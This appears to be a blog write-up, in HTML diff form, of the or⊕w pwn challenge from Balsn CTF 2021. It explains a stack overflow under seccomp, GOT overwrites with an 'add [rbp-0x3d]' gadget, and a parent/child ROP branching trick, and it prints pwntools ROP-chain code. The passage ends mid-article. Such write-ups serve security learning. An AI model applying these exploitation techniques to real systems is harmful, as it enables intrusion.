@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
+    <title>or⊕w writeup from Balsn CTF 2021 - x3ero0&#39;s blog</title>
+
+    <style type="text/css">
+        img.wp-smiley,
+        img.emoji {
+            display: inline !important;
+            border: none !important;
+            box-shadow: none !important;
+            height: 1em !important;
+            width: 1em !important;
+            margin: 0 .07em !important;
+            vertical-align: -0.1em !important;
+            background: none !important;
+            padding: 0 !important;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css" integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk=" crossorigin="anonymous">
+    <link rel='stylesheet' href='/css/custom.css' type='text/css' media='all' />
+    <link rel='stylesheet' href='/css/style.css' type='text/css' media='all' />
+    <link rel='stylesheet' href='/css/syntax.css' type='text/css' media='all' />
+    <link rel='stylesheet' href='/css/general.css' type='text/css' media='all' />
+    <link rel='stylesheet' href='/css/toc.css' type='text/css' media='all' />
+    <link rel='stylesheet' href='/css/image.css' type='text/css' media='all' />
+</head>
+
+    <body class="two-column">
+        <a href="#content">Skip to content</a>
+<div class="wrapper">
+    <header role="banner" class="banner widgets columns-1">
+        <a href="/" rel="home">
+            <h1 class="site">x3ero0&#39;s blog</h1>
+            <p></p>
+        </a>
+        <nav role="navigation" aria-label="Primary Navigation">
+
+            <ul class="menu">
+                <li class="menu-item "><a class="menu__link" href="/crackmes/">CRACKMES</a></li>
+                <li class="menu-item "><a class="menu__link" href="/posts/">POSTS</a></li>
+            </ul>
+            <select onChange="location.href=value;">
+                <option value="/crackmes/" class="menu-item menu-item-type-custom menu-item-object-custom" >CRACKMES</option>
+                <option value="/posts/" class="menu-item menu-item-type-custom menu-item-object-custom" >POSTS</option>
+            </select>
+        </nav>
+    </header>
+
+    <br>
+    <div style="width: 100%; max-height: 100px; text-align: center;">
+       
+</div>
+
+    <div class="breadcrumbs">
+        
+    </div>
+
+        <div id="content" class="content">
+
+<main role="main">
+    <article role="article" class="post type-post format-standard hentry">
+        <header class="post-header">
+            <h1>or⊕w writeup from Balsn CTF 2021</h1>
+            <div class="post-details">
+                <a rel="bookmark">
+                    <time datetime="2021-11-22T1122:533:366">2021-11-22</time>
+                </a>
+				
+<span style="float: right;">
+    <div id="fb-root" style="height: 100%;"></div>
+    
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.2"></script>
+    
+    <div class="fb-share-button" data-href="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/" data-layout="button_count" data-size="small">
+        <a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fx3ero0.github.io%2fposts%2forxw_balsn_ctf_2021_pwn%2f" class="fb-xfbml-parse-ignore">Share</a>
+    </div>
+    &nbsp;
+    <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-text="or⊕w writeup from Balsn CTF 2021" data-url="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/" data-show-count="false">Tweet</a>
+    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+    &nbsp;
+    
+</span>
+
+            </div>
+        </header>
+
+        <div class="post-content">
+            <ul>
+<li>Author : <a href="https://twitter.com/_how2hack_">how2hack</a></li>
+<li>Upload : Nov 20th, 2021</li>
+<li>Rating : I will rate it 10/10</li>
+<li>Platform : Linux</li>
+<li>Files : <a href="https://github.com/X3eRo0/Challenges/blob/master/Balsn_CTF_2021/Pwn/Orxw/orxw.zip?raw=true">or⊕w</a></li>
+<li>Desc : No more orw for you :(</li>
+</ul>
+
+
+<br>
+
+<h2 id="first-look">First look</h2>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/challenge.png"
+    alt="First look of the Challenge"
+    decoding="async"
+  />
+</div>
+<p><strong>or⊕w</strong> was the easiest pwn challenge from Balsn CTF 2021. There were 3 more Pwn tasks, which were really hard.
+in total there were 4 pwn challenges and I only managed to solve or⊕w. Here is the list of Pwn challenges.</p>
+<ul>
+<li>
+<ol>
+<li>or⊕w (BOF with seccomp) - 15 Solves</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>Futex (Kernel) - 0 Solves</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>Kawaii Note (Heap Note) - 1 Solve</li>
+</ol>
+</li>
+<li>
+<ol start="4">
+<li>NoteEdit (MacOs Heap Note) - 0 Solves</li>
+</ol>
+</li>
+</ul>
+<p>Here is the checksec output -</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/checksec.png"
+    alt="checksec"
+    decoding="async"
+  />
+</div>
+<p>I really liked <strong>or⊕w</strong> challenge because it was not like any other ROP challenge, it was a combined mixture of several different concepts together. I learned a lot from this challenge.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/main.png"
+    alt="main"
+    decoding="async"
+  />
+</div>
+<p>In this beautiful decompilation given by IDA, you could easily spot the vulnerability. Its a very obvious <strong>Stack Buffer Overflow</strong> Vulnerability. The stack only reserved space for 16 bytes but the <strong>read()</strong> function is reading 0x400 (1024) Bytes in input. But if you look closely, you will see that its not your normal buffer overflow challenge.</p>
+<p>After the call to <strong>read()</strong> we see that the program calls <strong>fork()</strong> and handles both parent and child differently. If you don&rsquo;t know what <strong>fork()</strong> does, basically it creates a clone of the process with exact same execution state and only one difference and that is the return value of the syscall. <strong>fork()</strong> is actually just a wrapper around the <strong>fork</strong> syscall. The newly created process is called the child of the original process and the original process is called the parent process.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/fork.png"
+    alt="fork"
+    decoding="async"
+  />
+</div>
+<p>The return value of the <strong>fork</strong> syscall will be different in parent and child so that the code can diffrentiate if its running in the child or the parent.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/wait.png"
+    alt="wait"
+    decoding="async"
+  />
+</div>
+<p>When <strong>fork()</strong> return a non-zero value, that means we are in the parent and this non-zero value is the PID (Process ID) of the child which was just spawned. You can see in the above code that if we are in the parent then we call the <strong>wait()</strong> which is just a wrapper around the <strong>WAIT</strong> system call. <strong>WAIT</strong> system call will wait (blocking wait) for any change in the child state of the calling process.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/fork2.png"
+    alt="fork2"
+    decoding="async"
+  />
+</div>
+<p>In the code above you can see it calls different seccomp functions to create different syscall filters in both parent and child. <strong>Seccomp</strong> filtering provides a means for a process to specify a filter for incoming system calls. These filters are sort of security mitigations to limit the damage if the process is compromised. The filters allow you to blacklist a bunch of syscalls and only allow few selected syscalls which the programmers thinks are safe.</p>
+<p>It closes <strong>stdin, stdout, stderr</strong> in the parent so we cannot do funky stuff in the child process.
+One thing I could not notice initially was the fact that the status word
+was stored on the <strong>.BSS</strong> section, which was very crucial for my exploit.</p>
+<p>So let&rsquo;s now analyse the seccomp filters of the child process and the parent process.</p>
+<h3 id="seccomp-parent">Seccomp parent</h3>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/seccomp_parent.png"
+    alt="seccomp parent"
+    decoding="async"
+  />
+</div>
+<p>This function apply&rsquo;s the following seccomp filter to the process.
+
+
+
+
+
+<table class="responsive-table styled-table">
+<thead>
+<tr>
+<th>SYS_NO.</th>
+<th>Syscall</th>
+<th>Filter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>001</td>
+<td>SYS_write</td>
+<td>Allowed</td>
+</tr>
+<tr>
+<td>060</td>
+<td>SYS_exit</td>
+<td>Allowed</td>
+</tr>
+<tr>
+<td>231</td>
+<td>SYS_exit_group</td>
+<td>Allowed</td>
+</tr>
+</tbody>
+</table>
+
+</p>
+<p>Performing any other other syscall will result in the process being killed by <strong>SIGSYS</strong> (Bad system call).</p>
+<h3 id="seccomp-child">Seccomp child</h3>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/seccomp_child.png"
+    alt="seccomp child"
+    decoding="async"
+  />
+</div>
+<p>This function apply&rsquo;s the following seccomp filter to the process.
+
+
+
+
+
+<table class="responsive-table styled-table">
+<thead>
+<tr>
+<th>SYS_NO.</th>
+<th>Syscall</th>
+<th>Filter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>001</td>
+<td>SYS_read</td>
+<td>Allowed</td>
+</tr>
+<tr>
+<td>002</td>
+<td>SYS_open</td>
+<td>Allowed</td>
+</tr>
+<tr>
+<td>257</td>
+<td>SYS_openat</td>
+<td>Allowed</td>
+</tr>
+<tr>
+<td>060</td>
+<td>SYS_exit</td>
+<td>Allowed</td>
+</tr>
+<tr>
+<td>231</td>
+<td>SYS_exit_group</td>
+<td>Allowed</td>
+</tr>
+</tbody>
+</table>
+
+</p>
+<hr>
+<p>Now Let&rsquo;s see what happens when the buffer overflow happens. We will send random data to the binary and we will observe the execution of both the child and the parent.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/segfault.png"
+    alt="segfault"
+    decoding="async"
+  />
+</div>
+<p>As you can see in the above image after the <strong>clone</strong> syscall, which is what <strong>fork()</strong> uses for some reason that i don&rsquo;t know, we see that child is spawned with PID <strong>23852</strong> and it gets a <strong>SIGSEGV</strong> signal and crashes with a segfault. Same thing happens with the parent but the difference is that it does not happen parallely as one would expect and it only happens once the child has exited/crashed.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/flow3.png"
+    alt="flow2"
+    decoding="async"
+  />
+</div>
+<p>It is because the parent does a <strong>wait</strong> syscall and it wait for the child to terminate first.</p>
+<p>So, the ROP chain that you provide is executed by both parent and child but not parallely. Child executes the ROPChain first and then the parent executes the ROPChain. The challenge now is how do you get the flag with all these seccomp filters applied 😕
+?</p>
+<p>Obviusly <strong>system()</strong> or <strong>ONE_Gadget</strong> won&rsquo;t work because they all eventually do the <strong>execve</strong> syscall which is blocked in both child and parent. So, how do you get the flag 🏁
+ ?</p>
+<p>One would say that just open the flag and read it in the child and then write the flag out in parent, but the memory is not shared in child and parent so even if we are able to read the flag we cannot just send the flag to parent to write it out on <strong>stdout</strong>.</p>
+<p>Also, if we create a ROP chain to read the flag in child, when the same ROP Chain is executed by the parent then parent will be killed by <strong>SIGSYS</strong> because <strong>open</strong> and <strong>read</strong> syscalls are not allowed in parent.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/sigsys.png"
+    alt="sigsys"
+    decoding="async"
+  />
+</div>
+<p>After 2 hours of brainstorming with my friends I figured out a way to exploit this thing. The idea is to execute different ROP chains on parent and child, but before trying to find a gadget that does this let&rsquo;s create the individual ROP chains for child and parent.</p>
+<p>Our goal is to read the &ldquo;flag&rdquo; file in child because <strong>open</strong> and <strong>read</strong> syscalls are only allowed in child. But, there is a problem that is we don&rsquo;t have a way to call <strong>open</strong> as of now. We can call read but before that we must open the file.</p>
+<h3 id="introducing-the-3d-gadget">Introducing the 3D-Gadget</h3>
+<p>This is the most powerful gadget you can find in an ELF compiled by GCC.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/3d.png"
+    alt="3d"
+    decoding="async"
+  />
+</div>
+<p>This gadget allows you to modify memory by adding a 32 bit value to that memory. With this gadget you could easily write 4 bytes at a time. This is the gadget that would allow us to call <strong>open</strong>.</p>
+<p>Because the binary has partial-relro we can use this gadget to make any <strong>got</strong> address to point to any arbitrary address in <strong>LibC</strong> by adding  an offset to the lower 32 bits.</p>
+<h3 id="environment-setup">Environment Setup</h3>
+<p>But to know the offset to add/subtract in the <strong>got</strong> address, we must know the exact <strong>LibC</strong> that was running on the server, but during the CTF I completely forgot that the Dockerfile was given to us and went with the old way of leaking an address and then using <a href="https://github.com/x3ero0/CTFMate">CTFMate</a> to find the libc version.</p>
+<p>I quickly crafted a ROP chain to print the got address of <strong>puts</strong> and <strong>read</strong> and then used <a href="https://github.com/x3ero0/CTFMate">CTFMate</a> to get the <strong>LibC</strong> and patch the binary to use the downloaded <strong>LibC</strong> and a custom <strong>Linker</strong> just for this <strong>LibC</strong>.</p>
+
+
+<script id="asciicast-qQz2ZWGrrsJOzrTJvLk7rQGOD" src="https://asciinema.org/a/qQz2ZWGrrsJOzrTJvLk7rQGOD.js" async></script>
+
+<h3 id="exploit-plan">Exploit Plan</h3>
+<p>Now the plan for our exploit is that we will first read the flag into child&rsquo;s memory and then we will get the first byte of the flag into the <strong>rdi</strong> register and then we will do exit syscall, the idea behind this is that when the child will exit and the parent will resume execution, the status word on <strong>BSS</strong> of the parent will have the exit code of child and since child exited with the first character of the flag, we essentially leaked one character of the flag from child.</p>
+<p>But in order to execute this plan we need a ROP chain that can differentiate between the parent and the child and executes different ROP when it is running in child (to open and read the flag) and when it is running in the parent (to print the leaked flag&rsquo;s character).</p>
+<p>After going through thousands of gadgets in LibC and the binary I found the perfect gadget. It lives inside <strong>__libc_csu_init</strong>.</p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/ropdiff.png"
+    alt="ropdiff"
+    decoding="async"
+  />
+</div>
+<p>The <strong>ROP DIFF Gadget</strong> starts at <strong>0x401561</strong> and the idea is that if <strong>rbp</strong> contains the value of status word and <strong>rbx</strong> contains <strong>zero</strong>, then we are essentially comparing the value of status word against <strong>zero</strong> and if its <strong>non-zero</strong> which means we are in the parent and we don&rsquo;t need to execute the open-read-exit ropchain which is for child. But if the value of status word is zero then we simply execute whatever rop chain there is on the stack after doing a bunch of <strong>pop</strong>s.</p>
+<p>When this gadget detects that we are in parent (non-zero status word) it will jump to <strong>0x401550</strong> which will try to call whatever function is at <strong>[r15 + rbx * 8]</strong> and since rbx is zero it will just dereference <strong>r15</strong> and call that address with arguments from <strong>r12, r13 and r14</strong>.</p>
+<p>To call <strong>puts(status word)</strong> we just need to make <strong>r15</strong> point to <strong>puts got</strong> and <strong>r12</strong> to the address of status word in <strong>BSS</strong>. We are lucky that <strong>PIE</strong> is disabled and the address of <strong>BSS</strong> fits in 32 bits because the upper 32 bits of <strong>r12</strong> are discarded and only lower 32 bits are moved into <strong>edi</strong> register.</p>
+<h3 id="getting-gadgets-from-libc">Getting Gadgets from LibC</h3>
+<p>For moving the value of status word in <strong>rbp</strong> I needed some gadgets which were not there in the binary, so I used the <strong>3D-Gadget</strong> to make some useless got functions into some usefull gadgets.</p>
+
+
+
+
+
+<table class="responsive-table styled-table">
+<thead>
+<tr>
+<th>GOT</th>
+<th>gadget</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>fork</strong></td>
+<td>xchg eax, ebp ; ret</td>
+</tr>
+<tr>
+<td><strong>setbuf</strong></td>
+<td>mov rax, qword ptr [rdi + 0x20] ; ret</td>
+</tr>
+<tr>
+<td><strong>read</strong></td>
+<td>pop rbx ; ret</td>
+</tr>
+</tbody>
+</table>
+
+
+<p>The rop chain looks like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#6272a4"># gadgets</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401573</span>  <span style="color:#6272a4"># pop rdi ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401571</span>  <span style="color:#6272a4"># pop rsi ; pop r15 ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>POP_RSP <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40156d</span>  <span style="color:#6272a4"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>RET_GDT <span style="color:#ff79c6">=</span> POP_RDI<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span> <span style="color:#6272a4"># ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>BSS_ADR <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x404090</span>  <span style="color:#6272a4"># ---</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>_3D_GDT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40125c</span>  <span style="color:#6272a4"># add dword [rbp-0x3D], ebx ; nop  ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>POP_RBP <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40156f</span>  <span style="color:#6272a4"># --- </span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>POP_RPX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40156a</span>  <span style="color:#6272a4"># ---</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>CALL_XX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401550</span>  <span style="color:#6272a4"># ---</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>STATUSG <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40408C</span>  <span style="color:#6272a4"># status word on BSS</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>X_AX_BP <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x04d360</span>  <span style="color:#6272a4"># xchg eax, ebp ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>M_AX_DI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0e1414</span>  <span style="color:#6272a4"># mov rax, qword ptr [rdi + 0x20] ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>POPRBX2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0331ff</span>  <span style="color:#6272a4"># pop rbx ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>EXITGDT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x122294</span>  <span style="color:#6272a4"># mov edi, eax ; mov eax, 0x3c ; syscall</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>stage_1 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>cyclic(offset)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#6272a4"># mov status in either rbp or rbx</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#6272a4"># if not zero then we call write(1, flag, 100)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#6272a4"># if zero simply return</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#6272a4"># setup xchg eax, ebp; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64((X_AX_BP <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;fork&#39;</span>]) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;fork&#39;</span>] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(ADD_VAL)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span style="color:#6272a4"># setup mov rax, qword ptr [rdi + 0x20] ; ret</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64((M_AX_DI <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;setbuf&#39;</span>]) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;setbuf&#39;</span>] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(ADD_VAL)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64((POPRBX2 <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;read&#39;</span>]) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;read&#39;</span>] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(ADD_VAL)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>
+</code></pre></div><p>With the setup complete, lets create the parent rop chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)           <span style="color:#6272a4"># rdi = status_word - 0x20</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(STATUSG <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])   <span style="color:#6272a4"># rbx = 0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;setbuf&#39;</span>]) <span style="color:#6272a4"># rax = [status_word]</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;fork&#39;</span>])   <span style="color:#6272a4"># ebp = eax</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(STATUSG<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)  <span style="color:#6272a4"># r12  # r12 = status_word+1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)                 <span style="color:#6272a4"># r13 = 0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)                 <span style="color:#6272a4"># r14 = 0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;puts&#39;</span>])   <span style="color:#6272a4"># r15 = puts.got</span>
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(CALL_XX <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x11</span>)    <span style="color:#6272a4"># ROP DIFF GADGET</span>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#6272a4"># NULL padding for continuing to child</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">7</span>             <span style="color:#6272a4"># continue to child</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>
+</code></pre></div><p>In the above ROP chain you can see at line 14 we are calling the <strong>ROP DIFF GADGET</strong> and this will call <strong>puts(status_word + 1)</strong> if value of <strong>rbp</strong> is non zero and it will continue to pop 7 values from stack if value of <strong>rbp</strong> is zero.</p>
+<p>The 7 NULLs are to account for the exit from <strong>ROP DIFF GADGET</strong></p>
+
+
+
+<div class="center">
+  <img
+    class="responsive"
+    src="/img/orxw/ropdiff2.png"
+    alt="ropdiff"
+    decoding="async"
+  />
